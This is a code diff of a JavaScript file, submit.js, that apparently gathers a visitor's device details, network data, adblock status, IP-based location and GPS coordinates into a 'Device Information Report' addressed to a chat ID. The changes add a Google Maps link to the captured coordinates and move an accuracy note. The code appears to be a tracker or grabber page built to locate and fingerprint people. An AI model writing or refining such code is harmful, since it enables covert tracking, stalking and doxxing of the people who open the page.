@@ -1,4 +1,4 @@
-// submit.js (updated: GPS, adblock, IP note placement)
+// submit.js (updated: IP section format + GPS map link)
 
 async function collectAndSend(chatId) {
   if (!chatId) {
@@ -60,14 +60,14 @@ async function collectAndSend(chatId) {
     }
   } catch (e) {}
 
-  // Network info (navigator.connection)
+  // Network info
   const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || null;
   const netType = connection ? (connection.effectiveType || 'Unknown') : 'Unknown';
   const downlink = connection ? (connection.downlink ? connection.downlink + ' Mbps' : 'Unknown') : 'Unknown';
   const rtt = connection ? (connection.rtt ? Math.round(connection.rtt) + ' ms' : 'Unknown') : 'Unknown';
   const saveData = connection ? (connection.saveData ? 'Enabled' : 'Disabled') : 'Unknown';
 
-  // Adblock detection (DOM bait + fetch)
+  // Adblock detection
   async function detectAdblock() {
     try {
       const bait = document.createElement('div');
@@ -127,6 +127,7 @@ async function collectAndSend(chatId) {
     }
   } catch (e) {}
 
+  // Build message
   const message = 
 `🔰 Device Information Report 🔰
 
@@ -151,15 +152,16 @@ async function collectAndSend(chatId) {
 
 📍 IP Info:
 - IP: ${ip}
-*Note: IP-based location may not be accurate.*
 - City: ${city}
 - Region: ${region}
 - Country: ${country}
+*Note: IP-based location may not be accurate.*
 
 📌 GPS:
 - Status: ${geoResult.status}
 - Latitude: ${geoResult.latitude}
 - Longitude: ${geoResult.longitude}
+- Map View: https://www.google.com/maps?q=${geoResult.latitude},${geoResult.longitude}
 
 🛡️ Adblocker: ${adblockResult}
 
